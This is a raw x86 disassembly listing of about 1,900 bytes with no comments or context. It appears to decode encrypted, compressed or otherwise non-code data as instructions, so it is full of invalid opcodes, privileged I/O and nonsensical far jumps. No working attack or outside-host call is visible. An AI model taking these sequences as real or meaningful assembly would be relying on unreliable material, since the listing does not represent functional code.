  41c8e9:	sub    BYTE PTR [ebp+0x5d],0x8
  41c8ed:	and    esi,edx
  41c8ef:	jp     0x41c918
  41c8f1:	pop    edi
  41c8f2:	or     edx,esp
  41c8f4:	addr16 push esp
  41c8f6:	sub    ch,BYTE PTR [eax]
  41c8f8:	jmp    0xce370fb0
  41c8fd:	retf   0x2aec
  41c900:	ss pusha 
  41c902:	int3   
  41c903:	les    edi,FWORD PTR ds:0xbe7c993f
  41c909:	xchg   edi,eax
  41c90a:	mov    bl,bh
  41c90c:	jmp    0x41c8b5
  41c90e:	jle    0x41c985
  41c910:	inc    esi
  41c911:	rol    BYTE PTR [esi-0x267892e6],cl
  41c917:	ret    
  41c918:	push   0x6e
  41c91a:	popf   
  41c91b:	mov    bl,0xa8
  41c91d:	xor    ebp,DWORD PTR [edi+0x60]
  41c920:	push   edx
  41c921:	sbb    edi,DWORD PTR [edx]
  41c923:	and    DWORD PTR [esi+0x4e],edx
  41c926:	addr16 sbb bl,bl
  41c929:	sub    bh,BYTE PTR [edi+ecx*4+0x100c9aa6]
  41c930:	mov    eax,ds:0x95822120
  41c935:	xchg   ecx,eax
  41c936:	mov    ecx,0x24b0ce95
  41c93b:	mov    ecx,0x5569279e
  41c940:	jmp    0xb692d9b0
  41c945:	sbb    ch,ch
  41c947:	cld    
  41c948:	xor    eax,0x4c4a7012
  41c94d:	adc    edi,edi
  41c94f:	sti    
  41c950:	in     al,0xf9
  41c952:	inc    esi
  41c953:	jmp    0x2169:0x3095194c
  41c95a:	pop    ss
  41c95b:	stc    
  41c95c:	or     DWORD PTR [ecx+0x33ec1e9f],esp
  41c962:	repnz add DWORD PTR [esp+ecx*1+0x43bbacb7],ecx
  41c96a:	cmp    ah,BYTE PTR [edi+ecx*1+0x5e]
  41c96e:	mov    fs,WORD PTR ds:0x7bbf937b
  41c974:	dec    edx
  41c975:	(bad)  
  41c976:	scas   eax,DWORD PTR es:[edi]
  41c977:	xor    esp,eax
  41c979:	in     eax,0xe7
  41c97b:	fdivrp st(1),st
  41c97d:	sar    esp,1
  41c97f:	loopne 0x41c9c7
  41c981:	lea    ebx,[esi+0x34c51931]
  41c987:	xor    al,BYTE PTR [esi+0x46067c71]
  41c98d:	mov    edi,0xc3683b9
  41c992:	mov    al,ds:0xd49c1814
  41c997:	xor    dh,BYTE PTR [eiz*1+0x6e51f777]
  41c99e:	popf   
  41c99f:	mov    bl,0x3f
  41c9a1:	push   0x1d
  41c9a3:	push   ss
  41c9a4:	pusha  
  41c9a5:	adc    DWORD PTR [ecx+0x33a3520],ecx
  41c9ab:	cmp    al,0xc5
  41c9ad:	clc    
  41c9ae:	enter  0x7153,0x62
  41c9b2:	call   0x18aa52bb
  41c9b7:	lahf   
  41c9b8:	xchg   ebp,eax
  41c9b9:	retf   0x2fc8
  41c9bc:	and    eax,0xe7d3da2e
  41c9c1:	jp     0x41ca27
  41c9c3:	shl    WORD PTR [edx-0x50],0x5e
  41c9c8:	aaa    
  41c9c9:	or     al,0xc2
  41c9cb:	gs jp  0x41ca13
  41c9ce:	cmp    eax,eax
  41c9d0:	std    
  41c9d1:	rol    DWORD PTR [edx+0x77],0xab
  41c9d5:	stos   DWORD PTR es:[edi],eax
  41c9d6:	push   eax
  41c9d7:	cmp    eax,edi
  41c9d9:	fdivr  DWORD PTR [ecx-0x1]
  41c9dc:	mov    ch,0x67
  41c9de:	fdivp  st(3),st
  41c9e0:	or     DWORD PTR [ecx-0x9],esp
  41c9e3:	sbb    al,0x2d
  41c9e6:	mov    DWORD PTR [ebp-0x11],esp
  41c9e9:	dec    edx
  41c9ea:	arpl   WORD PTR [ecx+esi*8+0x5672554e],bx
  41c9f1:	mov    eax,0xcd6eb94
  41c9f6:	scas   eax,DWORD PTR es:[edi]
  41c9f7:	or     DWORD PTR [ecx+0x7640913],eax
  41c9fd:	pop    edx
  41c9fe:	es cli 
  41ca00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ca01:	iret   
  41ca02:	dec    ecx
  41ca03:	inc    esi
  41ca04:	shr    ebp,cl
  41ca06:	popf   
  41ca07:	mov    ebx,0xa50751b9
  41ca0c:	jg     0x41ca79
  41ca0e:	ss xchg ecx,eax
  41ca10:	jmp    0x41de:0x5000ba89
  41ca17:	jae    0x41c9e6
  41ca19:	je     0x41ca77
  41ca1b:	sbb    BYTE PTR [edx],ch
  41ca1d:	lahf   
  41ca1e:	(bad)  [ebx+0x78]
  41ca21:	mov    ds:0xad647200,al
  41ca26:	or     bl,BYTE PTR [edx-0x4f]
  41ca29:	lea    ebx,[edi-0x6b2833ed]
  41ca2f:	out    0xf0,eax
  41ca31:	add    eax,0x66a4833c
  41ca36:	mov    ebp,0x554ad6b1
  41ca3b:	cmp    esp,DWORD PTR [eax-0x17]
  41ca3e:	pop    eax
  41ca3f:	sub    dl,ch
  41ca41:	cmc    
  41ca42:	in     eax,0xf1
  41ca44:	fcom   st(7)
  41ca46:	ins    DWORD PTR es:[edi],dx
  41ca47:	daa    
  41ca48:	mov    cs,WORD PTR [edi+0x392c306]
  41ca4e:	data16 mov bl,0x65
  41ca51:	imul   dl
  41ca53:	outs   dx,BYTE PTR ds:[esi]
  41ca54:	sub    edx,eax
  41ca56:	add    ch,cl
  41ca58:	push   esp
  41ca59:	iret   
  41ca5a:	fucomp st(5)
  41ca5c:	pop    esi
  41ca5d:	out    0xc9,al
  41ca5f:	(bad)  [edi+0x701f61a8]
  41ca65:	mov    ebp,0x72e6032b
  41ca6a:	push   ebp
  41ca6b:	add    DWORD PTR [edi+0x6a536a20],esi
  41ca71:	push   0xffffff98
  41ca73:	ror    DWORD PTR [eax-0x689471ef],0x59
  41ca7a:	and    dl,BYTE PTR [esi-0x3877c9e6]
  41ca80:	lahf   
  41ca81:	rol    esi,cl
  41ca83:	ds pushf 
  41ca85:	adc    eax,0x71367121
  41ca8a:	cdq    
  41ca8b:	and    dl,BYTE PTR [ecx+ecx*2]
  41ca8e:	dec    edi
  41ca8f:	inc    ebx
  41ca90:	das    
  41ca91:	aas    
  41ca92:	pop    eax
  41ca93:	shr    esp,cl
  41ca95:	pop    edx
  41ca96:	sub    edi,esi
  41ca98:	push   0x6f
  41ca9a:	nop
  41ca9b:	inc    ecx
  41ca9c:	inc    ebp
  41ca9d:	mov    bh,BYTE PTR [ebx-0x77]
  41caa0:	repnz aaa 
  41caa2:	cmp    cl,BYTE PTR [ebx+0x6b1dcf78]
  41caa8:	xchg   edi,eax
  41caa9:	fs loopne 0x41cb11
  41caac:	cmp    al,0x1e
  41caae:	push   esi
  41caaf:	ds mov ecx,0x100ed2f1
  41cab5:	dec    edi
  41cab6:	pop    ebp
  41cab7:	leave  
  41cab8:	es jne 0x41caf7
  41cabb:	js     0x41ca91
  41cabd:	retf   
  41cabe:	test   ch,al
  41cac0:	aam    0xf9
  41cac2:	adc    eax,0xc55c387c
  41cac7:	and    DWORD PTR [eax+0x483d82d3],0x393a65de
  41cad1:	loop   0x41cabe
  41cad3:	xor    edx,DWORD PTR [eax+0x2]
  41cad6:	dec    ebx
  41cad7:	cmp    eax,0xa2735b15
  41cadc:	pusha  
  41cadd:	jmp    0x41ca85
  41cadf:	xchg   ecx,eax
  41cae0:	inc    esi
  41cae1:	dec    edx
  41cae2:	fst    DWORD PTR es:[edi]
  41cae5:	call   0xbd2137e6
  41caea:	cdq    
  41caeb:	cmp    ecx,edx
  41caed:	in     eax,dx
  41caee:	mov    ecx,0x8185bba3
  41caf3:	xor    al,bl
  41caf5:	cmp    BYTE PTR [edx+eiz*4],ah
  41caf8:	mov    bl,0x56
  41cafa:	sbb    al,0x15
  41cafc:	aad    0xde
  41cafe:	pop    eax
  41caff:	xor    al,0x85
  41cb01:	sbb    ecx,DWORD PTR ds:0x18eea39d
  41cb07:	(bad)  
  41cb08:	rcl    dl,1
  41cb0a:	jmp    0xfcbd00b1
  41cb0f:	dec    ebp
  41cb10:	iret   
  41cb11:	outs   dx,BYTE PTR ds:[esi]
  41cb12:	fisub  WORD PTR [edx+0x76]
  41cb15:	pop    ebp
  41cb16:	fld    DWORD PTR [ebx]
  41cb18:	jmp    0xb634c463
  41cb1d:	pop    ebp
  41cb1e:	ja     0x41cac2
  41cb20:	inc    edi
  41cb21:	jnp    0x41cb3b
  41cb23:	cwde   
  41cb24:	(bad)  
  41cb25:	dec    DWORD PTR [edi]
  41cb27:	pop    ds
  41cb28:	mov    esp,0x5d902aba
  41cb2d:	push   edx
  41cb2e:	mov    dh,0x5e
  41cb30:	or     al,BYTE PTR [esi+0x71c7e60d]
  41cb36:	inc    esp
  41cb37:	je     0x41cbaf
  41cb39:	(bad)  
  41cb3a:	jmp    0x41cb3e
  41cb3c:	cmp    DWORD PTR [ecx],edi
  41cb3e:	loopne 0x41cbbd
  41cb40:	aad    0x83
  41cb42:	lss    esi,FWORD PTR [eax+0x965b856]
  41cb49:	mov    cl,0xaf
  41cb4b:	fucomp st(7)
  41cb4d:	pop    edx
  41cb4e:	sub    BYTE PTR [ecx+0x35],dh
  41cb51:	loopne 0x41cb26
  41cb53:	lds    ebx,FWORD PTR [ebx+0x67]
  41cb56:	(bad)  
  41cb58:	dec    ebp
  41cb59:	or     eax,0x1f9d7af1
  41cb5e:	push   cs
  41cb5f:	mov    ebx,DWORD PTR [ebx]
  41cb61:	sbb    DWORD PTR [edx-0x26],0x1
  41cb65:	outs   dx,BYTE PTR ds:[esi]
  41cb66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb67:	retf   
  41cb68:	lds    esp,FWORD PTR [edx+0x67]
  41cb6b:	or     ebx,0x2a
  41cb6e:	je     0x41cbef
  41cb70:	loopne 0x41cb9e
  41cb72:	lock add ah,BYTE PTR [eax]
  41cb75:	cmp    DWORD PTR [ecx-0x67a434d3],ebp
  41cb7b:	jge    0x41cb33
  41cb7d:	out    0x94,eax
  41cb7f:	call   0xa73784b5
  41cb84:	mov    edi,0x7a57e96d
  41cb89:	push   eax
  41cb8a:	jae    0x41cb5e
  41cb8c:	mov    eax,ds:0x6d0b7dec
  41cb91:	push   ebx
  41cb92:	stc    
  41cb93:	sti    
  41cb94:	lahf   
  41cb95:	mov    edx,0x344d7161
  41cb9a:	imul   edi,DWORD PTR [edi],0x67
  41cb9d:	sbb    al,0x37
  41cb9f:	jge    0x41cbd6
  41cba1:	hlt    
  41cba2:	mov    cl,0x28
  41cba4:	test   DWORD PTR [ecx-0xc8ffa74],0x212eb3fc
  41cbae:	inc    ebx
  41cbaf:	adc    eax,DWORD PTR [ebp+0x77e29ab1]
  41cbb5:	or     DWORD PTR [ecx-0x1e],ecx
  41cbb8:	repnz or BYTE PTR [esi],dl
  41cbbb:	outs   dx,DWORD PTR ds:[esi]
  41cbbc:	pop    ebp
  41cbbd:	cmp    DWORD PTR [edx],0x6b
  41cbc0:	mov    edx,0x23a75e77
  41cbc5:	mov    esp,0x73078dfd
  41cbca:	inc    esp
  41cbcb:	pop    ebx
  41cbcc:	sub    DWORD PTR [ebx-0x67],esp
  41cbcf:	das    
  41cbd0:	scas   eax,DWORD PTR es:[edi]
  41cbd1:	das    
  41cbd2:	psubsw mm2,QWORD PTR [eax-0x17]
  41cbd6:	hlt    
  41cbd7:	dec    eax
  41cbd8:	sub    BYTE PTR [edx],cl
  41cbda:	pop    ecx
  41cbdb:	add    BYTE PTR [eax],dh
  41cbdd:	not    DWORD PTR [edi]
  41cbdf:	jp     0x41cc27
  41cbe1:	je     0x41cbdc
  41cbe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cbe4:	xchg   edx,eax
  41cbe5:	mov    dl,0xfe
  41cbe7:	sbb    BYTE PTR [edi+0x1d],al
  41cbea:	cmp    al,0x5c
  41cbec:	outs   dx,BYTE PTR ds:[esi]
  41cbed:	xor    BYTE PTR [eax-0x1a6e109],0xb5
  41cbf4:	jl     0x41cbf5
  41cbf6:	inc    ecx
  41cbf7:	outs   dx,DWORD PTR ds:[esi]
  41cbf8:	pop    ebx
  41cbf9:	pop    esi
  41cbfa:	jg     0x41cbb3
  41cbfc:	jno    0x41cbb2
  41cbfe:	dec    eax
  41cbff:	frstor [edi]
  41cc01:	nop
  41cc02:	push   0x71
  41cc04:	fucompp 
  41cc06:	cdq    
  41cc07:	daa    
  41cc08:	cmp    DWORD PTR [eax+ebx*2-0x4a],ebp
  41cc0c:	inc    ebx
  41cc0d:	(bad)  
  41cc0e:	and    al,0xf6
  41cc10:	ins    BYTE PTR es:[edi],dx
  41cc11:	pop    ds
  41cc12:	scas   eax,DWORD PTR es:[edi]
  41cc13:	and    eax,0xf5e7c2fe
  41cc18:	push   edi
  41cc19:	mov    bl,0xa4
  41cc1b:	add    eax,0xb00e7bc9
  41cc20:	ss or  eax,0x8428c9ef
  41cc26:	jle    0x41cbe3
  41cc28:	inc    edi
  41cc29:	xor    dh,cl
  41cc2b:	or     eax,DWORD PTR [ebx-0x63]
  41cc2e:	add    bh,BYTE PTR [eax+eiz*4]
  41cc31:	scas   eax,DWORD PTR es:[edi]
  41cc32:	outs   dx,DWORD PTR ds:[esi]
  41cc33:	adc    cl,BYTE PTR [ebp-0x7]
  41cc36:	jbe    0x41cc46
  41cc38:	test   al,0x2
  41cc3a:	mov    edi,0x61c5884b
  41cc3f:	pusha  
  41cc40:	(bad)  
  41cc41:	scas   al,BYTE PTR es:[edi]
  41cc42:	fs push 0x43
  41cc45:	sti    
  41cc46:	stc    
  41cc47:	int3   
  41cc48:	mov    edx,0xa3caba68
  41cc4d:	mov    esp,0xadbd54f4
  41cc52:	test   eax,0x7011fd90
  41cc57:	xor    esp,DWORD PTR gs:[ebp-0x549d9671]
  41cc5e:	dec    ebx
  41cc5f:	mov    edi,0x4913b351
  41cc64:	inc    ebx
  41cc65:	mov    ebx,DWORD PTR [esp+eiz*2-0x370f4fdb]
  41cc6c:	cdq    
  41cc6d:	leave  
  41cc6e:	es icebp 
  41cc70:	cmp    DWORD PTR [edx-0x6f3553df],ebx
  41cc76:	sbb    ecx,esp
  41cc78:	or     esp,DWORD PTR [ebx+edi*4+0x40]
  41cc7c:	inc    esi
  41cc7d:	rol    BYTE PTR [eax-0x6a],0x6
  41cc81:	(bad)  
  41cc82:	cld    
  41cc83:	fisubr WORD PTR [edx]
  41cc85:	inc    edx
  41cc86:	stc    
  41cc87:	mov    WORD PTR ds:0xe365ab6a,?
  41cc8d:	popf   
  41cc8e:	jl     0x41ccaa
  41cc90:	fsub   st,st(1)
  41cc92:	push   0x56
  41cc94:	leave  
  41cc95:	pop    ecx
  41cc96:	enter  0x8d57,0x21
  41cc9a:	enter  0x3cbd,0x8e
  41cc9e:	fsub   QWORD PTR [ecx+0x38e3a602]
  41cca4:	pop    esi
  41cca5:	fisubr DWORD PTR [ebp-0x67]
  41cca8:	mov    ebp,0xb18c6592
  41ccad:	push   ss
  41ccae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ccaf:	add    DWORD PTR [ecx-0x59fb97e7],esp
  41ccb5:	sub    esi,DWORD PTR [edi+0x7b]
  41ccb8:	or     eax,0xb2451079
  41ccbd:	push   cs
  41ccbe:	stc    
  41ccbf:	out    0x8,eax
  41ccc1:	sbb    ebp,DWORD PTR [edx-0x3]
  41ccc4:	push   edx
  41ccc5:	pop    ecx
  41ccc6:	out    dx,al
  41ccc7:	cmp    DWORD PTR ds:0x312d46cc,eax
  41cccd:	pop    edi
  41ccce:	inc    DWORD PTR [edi-0x7c21e79b]
  41ccd4:	xlat   BYTE PTR ds:[ebx]
  41ccd5:	call   0xc79e9328
  41ccda:	pop    ecx
  41ccdb:	lds    ecx,FWORD PTR [ecx+0x5e966f8a]
  41cce1:	lock jp 0x41cd53
  41cce4:	out    0xa9,al
  41cce6:	xor    ecx,DWORD PTR [ebx]
  41cce8:	xor    bh,dl
  41ccea:	(bad)  
  41cceb:	test   DWORD PTR [eax],0x83fc48a1
  41ccf1:	xor    al,ch
  41ccf3:	sub    dl,cl
  41ccf5:	push   esp
  41ccf6:	mov    dh,0xdf
  41ccf8:	add    al,BYTE PTR [ecx]
  41ccfa:	imul   eax,DWORD PTR [ecx-0x5bac20c7],0x50bbe93d
  41cd04:	nop
  41cd05:	fnsave [ebx+edi*1+0x74f8c545]
  41cd0c:	hlt    
  41cd0d:	add    ecx,DWORD PTR [edx-0x16]
  41cd10:	sbb    dl,BYTE PTR [edi-0x6f]
  41cd13:	mov    ebx,0xe28e655f
  41cd18:	ret    0xbdf7
  41cd1b:	dec    esi
  41cd1c:	pop    ebp
  41cd1d:	mov    DWORD PTR [esi-0x3883ee7d],eax
  41cd23:	mov    eax,0x33187e86
  41cd28:	push   ecx
  41cd29:	mov    ds:0x23f83f28,al
  41cd2e:	into   
  41cd2f:	push   ebx
  41cd30:	push   ebp
  41cd31:	mov    ah,0x25
  41cd33:	and    al,0xff
  41cd35:	mov    dl,0x2c
  41cd37:	push   0xad3ad817
  41cd3c:	aad    0x64
  41cd3e:	mov    ch,bh
  41cd40:	pop    es
  41cd41:	push   0xffffff88
  41cd43:	adc    dh,BYTE PTR [ecx+0x54c5c008]
  41cd49:	inc    edx
  41cd4a:	mov    ah,0x17
  41cd4c:	sbb    ch,al
  41cd4e:	(bad)  
  41cd4f:	lods   eax,DWORD PTR ds:[esi]
  41cd50:	inc    esi
  41cd51:	rcl    BYTE PTR ds:0xe57ff4f9,1
  41cd57:	mov    esi,0x46e90cc6
  41cd5c:	sub    BYTE PTR [edi-0x3057daa5],bl
  41cd62:	cmp    BYTE PTR [eax+0x32],bl
  41cd65:	push   cs
  41cd66:	pop    ebx
  41cd67:	inc    esi
  41cd68:	imul   edx,DWORD PTR [ebp-0x4d2ccb53],0xb08ae8cb
  41cd72:	pop    ecx
  41cd73:	pop    ss
  41cd74:	jmp    0x6610f7da
  41cd79:	mov    gs,WORD PTR [edx+edi*1+0x38]
  41cd7d:	adc    eax,0x73a68ff5
  41cd82:	or     cl,BYTE PTR [eax]
  41cd84:	xor    edi,edi
  41cd86:	xor    bl,BYTE PTR [esi+0x231ce1e]
  41cd8c:	into   
  41cd8d:	add    eax,0xdc698613
  41cd92:	scas   al,BYTE PTR es:[edi]
  41cd93:	adc    edi,DWORD PTR [eax+0x11]
  41cd96:	(bad)  
  41cd97:	out    0x26,eax
  41cd99:	and    DWORD PTR [edi-0x761d602d],edi
  41cd9f:	stos   DWORD PTR es:[edi],eax
  41cda0:	mov    edi,0x37c96b21
  41cda5:	cli    
  41cda6:	test   ah,ch
  41cda8:	inc    ebp
  41cda9:	cmc    
  41cdaa:	test   BYTE PTR [ecx+0x35d9f2a6],al
  41cdb0:	jno    0x41cdc8
  41cdb2:	call   0x418c:0x8a4d3d8
  41cdb9:	mov    dh,0xea
  41cdbb:	sub    esi,ecx
  41cdbd:	cmp    al,0x38
  41cdbf:	bound  esi,QWORD PTR ds:0xfb691f50
  41cdc5:	xchg   esp,eax
  41cdc6:	add    al,0x70
  41cdc8:	fidivr DWORD PTR [ebp-0x3b29a6c5]
  41cdce:	popa   
  41cdcf:	std    
  41cdd0:	sub    bl,bl
  41cdd2:	push   esp
  41cdd3:	aam    0x56
  41cdd5:	sbb    al,0x65
  41cdd7:	mov    BYTE PTR [edi],cl
  41cdd9:	add    al,0xc6
  41cddb:	iret   
  41cddc:	loopne 0x41ce58
  41cdde:	add    BYTE PTR [ebx],0x21
  41cde1:	sbb    edx,DWORD PTR [ebx+0x2d39d9b2]
  41cde7:	ds push ss
  41cde9:	adc    dh,BYTE PTR [esi-0x293c2063]
  41cdef:	and    eax,0xb21f673f
  41cdf4:	cmp    al,bl
  41cdf6:	into   
  41cdf7:	mov    eax,0xed218c23
  41cdfc:	sbb    ebx,DWORD PTR [eax]
  41cdfe:	xchg   ecx,eax
  41cdff:	jl     0x41cdcc
  41ce01:	in     eax,dx
  41ce02:	xor    al,BYTE PTR [ecx+ecx*2-0x15]
  41ce06:	mov    ds:0xd4e8731a,eax
  41ce0b:	imul   ecx,edi,0xffffff9f
  41ce0e:	in     al,dx
  41ce0f:	pop    esi
  41ce10:	sbb    dh,BYTE PTR [ebp-0x66]
  41ce13:	cmp    cl,BYTE PTR [esi]
  41ce15:	ins    DWORD PTR es:[edi],dx
  41ce16:	in     al,0xd
  41ce18:	sar    BYTE PTR [edx+ecx*8-0x26],cl
  41ce1c:	sbb    eax,0x575bf8a9
  41ce21:	fs loop 0x41ce09
  41ce24:	xor    esp,DWORD PTR [ecx]
  41ce26:	or     eax,0xaa7fe92a
  41ce2b:	fsub   st(2),st
  41ce2d:	rol    ecx,0x37
  41ce30:	add    BYTE PTR [eax],dh
  41ce32:	fimul  WORD PTR [eax+0x40]
  41ce35:	icebp  
  41ce36:	test   DWORD PTR [edx],ebp
  41ce38:	add    BYTE PTR [ebp-0x43a76dc4],bh
  41ce3e:	test   DWORD PTR [eax+0x36cff6cf],0xabde6dd4
  41ce48:	cwde   
  41ce49:	dec    edx
  41ce4a:	(bad)  
  41ce4b:	push   cs
  41ce4c:	(bad)  
  41ce4d:	daa    
  41ce4e:	push   edx
  41ce4f:	pop    eax
  41ce50:	mov    bh,0xd2
  41ce52:	push   esi
  41ce53:	outs   dx,DWORD PTR ds:[esi]
  41ce54:	jle    0x41ce93
  41ce56:	add    BYTE PTR [edi-0x700eb2c4],0xc2
  41ce5d:	mov    dh,0x18
  41ce5f:	dec    ebx
  41ce60:	push   ebx
  41ce61:	rol    BYTE PTR [ebx-0x53],cl
  41ce64:	ret    0x7629
  41ce67:	jne    0x41ceb2
  41ce69:	add    DWORD PTR [eax],esi
  41ce6b:	dec    ecx
  41ce6c:	jno    0x41cea1
  41ce6e:	dec    esi
  41ce6f:	jmp    FWORD PTR [esi-0x3e]
  41ce72:	mov    ds:0x49133111,eax
  41ce77:	out    0xf3,eax
  41ce79:	jecxz  0x41ce64
  41ce7b:	mov    cl,dl
  41ce7d:	in     eax,0xfd
  41ce7f:	retf   0x3d10
  41ce82:	int3   
  41ce83:	jg     0x41ce40
  41ce85:	xchg   edi,eax
  41ce86:	pop    edi
  41ce87:	loope  0x41ce6f
  41ce89:	leave  
  41ce8a:	push   cs
  41ce8b:	add    eax,DWORD PTR [edx+0x5e21334e]
  41ce91:	pcmpgtb mm6,mm7
  41ce94:	aas    
  41ce95:	shr    DWORD PTR [edx],1
  41ce97:	int    0x1e
  41ce99:	sbb    eax,0xafafeac8
  41ce9e:	mov    DWORD PTR [eax],esp
  41cea0:	inc    edi
  41cea1:	inc    eax
  41cea2:	adc    al,0x68
  41cea4:	dec    edx
  41cea5:	sbb    bl,BYTE PTR [ebp-0x24ba90ed]
  41ceab:	mov    cl,0xaf
  41cead:	lea    edi,[ecx-0x7de67bc0]
  41ceb3:	sti    
  41ceb4:	aas    
  41ceb5:	push   ebx
  41ceb6:	mov    DWORD PTR [edi],eax
  41ceb8:	push   eax
  41ceb9:	mov    ebx,0xd505a40d
  41cebe:	xchg   edx,eax
  41cebf:	mov    al,ds:0xe8781d13
  41cec4:	das    
  41cec5:	mov    ch,BYTE PTR [eax-0x27]
  41cec8:	jbe    0x41cf12
  41ceca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cecb:	in     al,0x86
  41cecd:	xor    DWORD PTR [esi*2-0x58ee7468],ebp
  41ced4:	xchg   ecx,eax
  41ced5:	shl    BYTE PTR [ebp-0x1ccc9473],cl
  41cedb:	xor    dl,BYTE PTR [ecx]
  41cedd:	loope  0x41cef1
  41cedf:	(bad)  
  41cee0:	call   FWORD PTR [eax-0x4c19ae45]
  41cee6:	jp     0x41cee3
  41cee8:	pop    esi
  41cee9:	test   eax,0x627003af
  41ceee:	add    eax,0x32e7a859
  41cef3:	hlt    
  41cef4:	imul   edx,DWORD PTR [esi+0x140d7505],0x1e1405af
  41cefe:	jmp    0x8299:0xb1114199
  41cf05:	pop    eax
  41cf06:	or     eax,0x6d1cd062
  41cf0b:	stos   BYTE PTR es:[edi],al
  41cf0c:	and    edx,DWORD PTR [edx]
  41cf0e:	call   0x14b9:0x7281842b
  41cf15:	xchg   esp,eax
  41cf16:	jl     0x41cef1
  41cf18:	dec    esp
  41cf19:	(bad)  
  41cf1a:	outs   dx,DWORD PTR ds:[esi]
  41cf1b:	xlat   BYTE PTR ds:[ebx]
  41cf1c:	dec    esp
  41cf1d:	add    BYTE PTR [edi],ch
  41cf1f:	sub    al,0x89
  41cf21:	das    
  41cf22:	mov    ah,0xdf
  41cf24:	sub    ebp,DWORD PTR [edx]
  41cf26:	retf   
  41cf27:	mov    esp,edi
  41cf29:	push   cs
  41cf2a:	rcr    BYTE PTR [edi-0xabfc1f2],1
  41cf30:	pop    edx
  41cf31:	sbb    cl,cl
  41cf33:	inc    esi
  41cf34:	test   eax,0x6ea22506
  41cf39:	icebp  
  41cf3a:	jns    0x41cf66
  41cf3c:	jg     0x41ced9
  41cf3e:	fnstenv [ebp-0x56d066ea]
  41cf44:	outs   dx,DWORD PTR ds:[esi]
  41cf45:	popf   
  41cf46:	pop    ebx
  41cf47:	loop   0x41cf24
  41cf49:	mov    edi,0xbb36e4ed
  41cf4e:	cmp    BYTE PTR [eax+0x2b90781e],0x6e
  41cf55:	xor    DWORD PTR [ecx-0x29],esi
  41cf58:	sahf   
  41cf59:	mov    bl,dl
  41cf5b:	jb     0x41cf1d
  41cf5d:	mov    edi,0x870fa629
  41cf62:	sbb    al,BYTE PTR [edi]
  41cf64:	xlat   BYTE PTR ds:[ebx]
  41cf65:	(bad)  
  41cf66:	xchg   edi,eax
  41cf67:	popa   
  41cf68:	scas   eax,DWORD PTR es:[edi]
  41cf69:	add    DWORD PTR [eax-0x2e],ecx
  41cf6c:	inc    esp
  41cf6d:	stos   DWORD PTR es:[edi],eax
  41cf6e:	rcl    ecx,1
  41cf70:	cwde   
  41cf71:	test   DWORD PTR [ebx+esi*1-0x2e301f3c],edx
  41cf78:	or     eax,0x9e083a96
  41cf7d:	inc    ebx
  41cf7e:	lea    esp,[ebx+0x452ae0ef]
  41cf84:	shl    DWORD PTR [eax+0x7e090baf],1
  41cf8a:	cmp    al,0x8
  41cf8c:	repnz call 0x48c4:0x8e9a3faa
  41cf94:	les    ecx,FWORD PTR [ecx-0x51]
  41cf97:	bound  ebx,QWORD PTR [ebx-0x41ac7dde]
  41cf9d:	jmp    0x41cf2e
  41cf9f:	add    eax,0x633d1a8b
  41cfa4:	sar    dh,0x67
  41cfa7:	or     eax,DWORD PTR [ecx]
  41cfa9:	and    al,0x4d
  41cfab:	sbb    eax,0x7c95c727
  41cfb0:	lahf   
  41cfb1:	dec    ebp
  41cfb2:	sar    DWORD PTR [edi+ebp*4+0x5b],1
  41cfb6:	or     BYTE PTR ds:0x8a6ecf97,bh
  41cfbc:	push   ds
  41cfbd:	or     BYTE PTR [eax],ah
  41cfbf:	sbb    eax,0xe789bc03
  41cfc4:	push   eax
  41cfc5:	mov    ebp,0x579b697d
  41cfca:	test   al,0xcc
  41cfcc:	xchg   ebp,eax
  41cfcd:	dec    eax
  41cfce:	pop    ecx
  41cfcf:	adc    DWORD PTR [ebx-0x5],ebx
  41cfd2:	push   edx
  41cfd3:	jne    0x41cfd4
  41cfd5:	jmp    0x41d016
  41cfd7:	aam    0x2b
  41cfd9:	pop    edi
  41cfda:	(bad)  
  41cfdb:	cmp    BYTE PTR [eax+eiz*4+0x2b],al
  41cfdf:	mov    ds:0x962c0d0e,al
  41cfe4:	push   ebx
  41cfe5:	or     ebp,DWORD PTR [eax+0x66]
  41cfe8:	push   ebx
  41cfe9:	int    0x41
  41cfeb:	loopne 0x41d05d
  41cfed:	out    0xc7,eax
  41cfef:	mov    dh,0x10
  41cff1:	in     al,dx
  41cff2:	xchg   dx,ax
  41cff4:	ret    0xad7e
  41cff7:	stos   BYTE PTR es:[edi],al
  41cff8:	ficom  WORD PTR [eax]
  41cffa:	ss push 0x68aff7c6
  41d000:	dec    edi
  41d001:	aas    
  41d002:	xor    eax,DWORD PTR fs:[edi+0x8286576]
  41d009:	out    dx,eax
  41d00a:	pop    eax
  41d00b:	aaa    
  41d00c:	cmp    al,0x86
  41d00e:	std    
  41d00f:	xchg   ecx,eax
  41d010:	je     0x41d06a
  41d012:	inc    ecx
  41d013:	or     eax,0xc5fffd82
  41d018:	or     eax,0x67e1ed30
  41d01d:	push   ss
  41d01e:	jle    0x41d090
  41d020:	loop   0x41d05a
  41d022:	xor    ebp,DWORD PTR [eax-0x718b6390]
  41d028:	retf   
  41d029:	in     al,0x7e
  41d02b:	rcr    DWORD PTR [ebp-0x2f],1
  41d02e:	adc    DWORD PTR [esp+esi*1],edi
  41d031:	mov    esp,0x5a26b6f0
  41d036:	dec    esi
  41d037:	inc    DWORD PTR ds:0xd0da029a
  41d03d:	pop    ebx
  41d03e:	sbb    bh,BYTE PTR [ebx+edx*1]
  41d041:	sub    esi,DWORD PTR [esi-0x55]
  41d044:	dec    eax
  41d045:	cs stos DWORD PTR es:[edi],eax
  41d047:	jns    0x41d0ab
  41d049:	and    ecx,DWORD PTR [eax]
  41d04b:	movups XMMWORD PTR [edx],xmm4
  41d04e:	into   
  41d04f:	push   cs
  41d050:	rcl    ah,cl
  41d052:	pop    ebx
  41d053:	mov    edi,0x49bb3c9e
  41d058:	cmp    DWORD PTR [edi-0xf6feb64],ebp
  41d05e:	repnz dec edi
  41d060:	dec    esp
  41d061:	and    edx,DWORD PTR [eax-0x63258d87]
  41d067:	fwait
  41d068:	mov    al,0x5
  41d06a:	sbb    BYTE PTR [ebx+0x1bd5fce4],dl
  41d070:	dec    edi
  41d071:	sub    eax,0x652c58d0
  41d076:	jns    0x41d02d
  41d078:	loopne 0x41d08a
  41d07a:	mov    edx,0x95cf3b13
  41d07f:	loope  0x41d096
  41d081:	pop    es
